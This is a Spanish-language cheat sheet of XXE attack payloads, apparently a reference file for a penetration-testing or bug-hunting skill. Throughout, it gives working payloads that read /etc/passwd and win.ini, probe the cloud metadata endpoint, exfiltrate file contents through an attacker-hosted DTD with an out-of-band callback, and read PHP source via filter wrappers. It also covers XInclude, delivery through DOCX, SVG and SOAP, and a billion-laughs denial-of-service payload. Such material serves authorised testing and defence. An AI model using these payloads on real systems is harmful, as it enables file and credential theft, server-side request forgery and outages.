# XXE Payloads

> Ver `skills/hunt/xxe`. In-band (archivo en respuesta) o OOB (callback).
> Un parser que rechaza DOCTYPE con error claro no es vulnerable.

## Detección / file read in-band

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

```xml
-- Windows:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
```

## SSRF vía XXE (cuando file:// está bloqueado)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root>&xxe;</root>
```

## Blind XXE — OOB vía external DTD (el caso común moderno)

```xml
-- Paso 1: DTD hospedado en {attacker}/evil.dtd:
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{TOKEN}.oast.host/?d=%file;'>">
%eval;
%exfil;

-- Paso 2: documento enviado al target:
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{attacker}/evil.dtd"> %remote; ]>
<root/>
```

## PHP wrappers (cuando el parser es PHP/libxml)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/config.php"> ]>
-- Respuesta en base64 → decodificar localmente. Demuestra lectura de código fuente.
```

## XInclude (cuando no se controla el DOCTYPE — ej. XML dentro de SOAP)

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

## Vectores de entrega alternativos

```
-- DOCX/XLSX: descomprimir, inyectar entidad en cualquier .xml, recomprimir.
-- SVG upload: <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-- SOAP body: entidad en el body del envelope.
-- sitemap.xml / RSS import: mismo principio.
```

## DOS (billion laughs) — SOLO con autorización explícita de DoS

```xml
<!DOCTYPE lolz [ <!ENTITY a "xxxxxxxxxx">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"> ]>
<root>&c;</root>
-- Casi nunca autorizado. Preferir demostrar lectura/exfil antes que DoS.
```

## Gotchas de uso

- Error "DOCTYPE is disallowed" = parser endurecido → no vulnerable (N/A).
- Entidades externas generales bloqueadas pero parameter entities permitidas
  → blind XXE vía external DTD sigue funcionando (el caso más común).
- La evidencia es el CONTENIDO leído o el CALLBACK con datos — no el hecho
  de que el parser acepte el documento.
